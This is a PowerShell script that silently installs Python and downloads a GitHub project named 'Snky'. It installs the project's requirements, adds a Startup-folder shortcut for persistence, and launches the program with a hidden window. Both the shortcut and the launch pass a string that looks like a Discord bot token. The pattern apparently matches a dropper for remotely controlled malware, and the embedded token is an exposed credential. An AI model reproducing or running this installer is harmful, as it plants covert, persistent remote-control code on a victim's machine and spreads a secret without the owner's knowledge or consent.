$projectUrl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
$pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
$pythonInstaller = "$($env:TEMP)\python.exe"

#PYTHON INSTALLER
Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller

#PYTHON INSTALLATION
Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
$pythonPath = Join-Path $env:ProgramFiles "Python310"
[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pythonPath","User")

Invoke-WebRequest -Uri $projectUrl -OutFile "$($env:TEMP)\Snky.zip"
Expand-Archive -Path "$($env:TEMP)\Snky.zip" -DestinationPath "$($env:LOCALAPPDATA)\Snky" -Force
cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\Snky\Snky-main\requirements.txt"

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\Snky.lnk")
$Shortcut.TargetPath = "c:\System32\cmd.exe"
$Shortcut.Arguments = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw MTE2OTU4MDgwOTQxNDUyOTA2NQ.G6bQfc.cT0wAuwHSa-M2oV0jfKXLwcbx_thL0xlaF7MN8"
$Shortcut.Save()

Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" MTE2OTU4MDgwOTQxNDUyOTA2NQ.G6bQfc.cT0wAuwHSa-M2oV0jfKXLwcbx_thL0xlaF7MN8 -Wait -WindowStyle Hidden



